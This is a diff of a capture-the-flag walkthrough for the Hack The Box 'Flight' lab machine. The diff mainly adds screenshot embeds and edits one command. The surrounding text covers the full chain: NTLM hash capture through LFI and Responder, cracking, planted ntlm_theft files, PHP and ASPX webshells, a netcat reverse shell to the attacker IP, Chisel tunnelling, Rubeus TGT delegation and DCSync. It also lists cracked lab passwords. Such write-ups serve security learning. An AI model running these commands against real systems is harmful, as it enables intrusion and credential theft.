@@ -29,6 +29,8 @@ We began with a comprehensive Nmap scan to identify the attack surface. The resu
 ```bash
 nmap -sC -sV -p- 10.129.228.120
 ```
+
+![Nmap Scan](Assets/image.png)
 _Figure 1: Initial Nmap scan revealing Domain Controller services (53, 88, 445)._
 
 ### Subdomain Enumeration
@@ -42,10 +44,12 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-11000
 
 ```
 
+![Subdomain Discovery](Assets/image2.png)
 _Figure 2: Discovery of the `school.flight.htb` subdomain._
 
 Adding this to our `/etc/hosts` file allowed us to access the new application.
 
+![School Portal](Assets/image3.png)
 _Figure 3: The `school.flight.htb` interface._
 
 ----------
@@ -58,6 +62,7 @@ Navigating the `school.flight.htb` site, we observed a URL structure that sugges
 
 We tested for **Local File Inclusion (LFI)** by attempting to traverse the directory structure. While direct file reading (e.g., `../../../../windows/win.ini`) appeared blocked or sanitized, the application was still attempting to resolve file paths.
 
+![LFI Parameter](Assets/image4.png)
 _Figure 4: The vulnerable `view` parameter._
 
 ### Exploiting LFI for Forced Authentication
@@ -74,6 +79,7 @@ sudo responder -I tun0
 
 **Trigger:** We pointed the vulnerable `view` parameter to our attacker IP via a UNC path: `http://school.flight.htb/index.php?view=//10.10.16.160/fakeshare`
 
+![Responder Capture](Assets/image5.png)
 _Figure 5: Successfully capturing the NTLMv2 hash for `flight\svc_apache`._
 
 ### Cracking the Hash
@@ -94,6 +100,7 @@ hashcat -m 5600 svc_apache_hash.txt /usr/share/wordlists/rockyou.txt
 -   **Password:** `S@Ss!K@*t13`
     
 
+![Hashcat Crack](Assets/image6.png)
 _Figure 6: Cracking the service account password._
 
 ---
@@ -108,6 +115,7 @@ netexec smb 10.129.228.120 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
 ```
 **Discovery:** The user **`S.Moon`** reuses the same password. This provided us a valid domain user context.
 
+![Password Spray](Assets/image8.png)
 _Figure 7: Identifying password reuse for `S.Moon`._
 
 ### SMB Enumeration (The Trap)
@@ -122,6 +130,7 @@ smbclient -L //10.129.228.120 -U S.Moon
 
 We discovered a non-standard share named **`Shared`**. Listing its permissions revealed that our user had **Write Access**.
 
+![Share Enumeration](Assets/image9.png)
 _Figure 8: Discovery of the writable `Shared` folder._
 
 ### The Watering Hole Strategy
@@ -139,6 +148,7 @@ python3 ntlm_theft.py -g all -s 10.10.16.160 -f theft
 
 ```
 
+![Share Enumeration](Assets/image10.png)
 _Figure 9: Generating the hash theft payloads._
 
 **Planting the Trap:** We uploaded the generated files to the `Shared` directory.
@@ -150,6 +160,7 @@ put flight.scf
 
 ```
 
+![Share Enumeration](Assets/image11.png)
 _Figure 10: Uploading the malicious files to the writable share._
 
 ### Capture & Crack (C.Bum)
@@ -162,14 +173,14 @@ We restarted `Responder` and waited. Within minutes, the user **`C.Bum`** browse
     
 -   **Hash:** `(Captured via Responder)`
     
-
+![Share Enumeration](Assets/image12.png)
 _Figure 11: Capturing `C.Bum`'s NTLMv2 hash._
 
 We cracked this hash using `hashcat` with the `rockyou.txt` wordlist.
 
 -   **Password:** `Tikkycoll_431012284`
     
-
+![Share Enumeration](Assets/image13.png)
 _Figure 12: Cracking the `C.Bum` password._
 
 ---
@@ -184,6 +195,7 @@ smbclient //10.129.228.120/Web -U C.Bum
 ```
 Listing the contents confirmed this was the **Webroot** for `flight.htb` (`C:\inetpub\wwwroot\flight.htb`). This is a critical misconfiguration: we could write files that the web server would execute.
 
+![Share Enumeration](Assets/image15.png)
 _Figure 13: Identifying the writable `Web` share._
 
 ### Staging the Payload
@@ -205,6 +217,8 @@ We uploaded both files to the `Web` share via SMB.
 put nc64.exe
 put revshl.php
 ```
+
+![Share Enumeration](Assets/image21.png)
 _Figure 14: Uploading the backdoor and netcat binary._
 
 ### Execution & Shell
@@ -221,11 +235,12 @@ nc -nvlp 9001
 **Trigger:**
 
 ```
-curl -G [http://flight.htb/revshl.php](http://flight.htb/revshl.php) --data-urlencode "c=nc64.exe -e cmd.exe 10.10.16.160 9001"
+curl -G http://flight.htb/revshl.php --data-urlencode "c=nc64.exe -e cmd.exe 10.10.16.160 9876"
 ```
 
 **Result:** We received a reverse shell as `flight\svc_apache`.
 
+![Share Enumeration](Assets/image22.png)
 _Figure 15: Successful reverse shell execution._
 
 ----------
@@ -241,6 +256,7 @@ netstat -an | findstr "LISTENING"
 
 ```
 
+![Share Enumeration](Assets/image26.png)
 _Figure 16: Discovery of the internal HTTP service on Port 8000._
 
 ### Establishing the Chisel Tunnel
@@ -263,12 +279,18 @@ To access this internal service, we set up a **SOCKS Tunnel** using `Chisel`.
 
 _Logic: "Connect to my attacker box on port 8000. Forward my local port 8001 to the target's internal port 8000."_
 
+![Share Enumeration](Assets/image27.png)
+
+![Share Enumeration](Assets/image28.png)
+
+![Share Enumeration](Assets/image29.png)
 _Figure 17: Establishing the reverse tunnel._
 
 ### Accessing the Internal Site
 
 We configured our browser (or FoxyProxy) to use the tunnel, or simply accessed `http://localhost:8001` if using port forwarding. This revealed a **Development Site** hosted internally.
 
+![Share Enumeration](Assets/image30.png)
 _Figure 18: Accessing the internal Development portal via the tunnel._
 
 ---
@@ -285,6 +307,8 @@ icacls C:\inetpub\development
 ```
 **Discovery:** The user **`C.Bum`** (whose credentials we have) has **Write Access** to this directory.
 
+
+![Share Enumeration](Assets/image33.png)
 _Figure 19: Confirming write access to the internal development folder._
 
 ### Webshell Upload & Execution
@@ -304,6 +328,14 @@ put tunneled_payload.aspx
 
 **Result:** We obtained command execution as **`iis apppool\defaultapppool`**.
 
+![Share Enumeration](Assets/image35.png)
+
+![Share Enumeration](Assets/image36.png)
+
+![Share Enumeration](Assets/image37.png)
+
+![Share Enumeration](Assets/image38.png)
+
 _Figure 20: Execution as the IIS Service Account._
 
 ----------
@@ -319,6 +351,7 @@ Running `whoami /priv` on our new shell revealed a critical privilege:
 
 This privilege allows a service to impersonate any user who connects to it. While traditional "Potato" exploits (JuicyPotato, PrintSpoofer) are often patched or detected, we utilized **`Rubeus`** to perform a Kerberos-based variant known as `tgtdeleg`.
 
+![Share Enumeration](Assets/image39.png)
 _Figure 21: Confirming `SeImpersonatePrivilege`._
 
 ### Rubeus TGT Delegation
@@ -332,6 +365,7 @@ We uploaded `Rubeus.exe` to the target and executed the `tgtdeleg` command. This
 
 **Output:** Rubeus returned a base64-encoded Kerberos ticket (Kirbi format).
 
+![Share Enumeration](Assets/image40.png)
 _Figure 22: Extracting the TGT via Rubeus._
 
 ### Ticket Manipulation & DCSync
@@ -374,4 +408,23 @@ impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
 
 ```
 
+![Share Enumeration](Assets/image41.png)
 _Figure 23: Dumping the Administrator NTLM hash._
+
+---
+![Share Enumeration](Assets/image42.png)
+_Figure 24: Confirming Admin access on WinRM using Nxc and revealing the root flag!._
+
+---
+![Share Enumeration](Assets/image43.png)
+_Figure 25: Abusing Admin WinRM access to get shell as `flight/administrtor`._
+
+---
+![Share Enumeration](Assets/image44.png)
+_Figure 26: Dumping all users NTDS secrets._
+
+---
+![Share Enumeration](Assets/image45.png)
+_Figure 27: Flight has been Pwned._
+
+
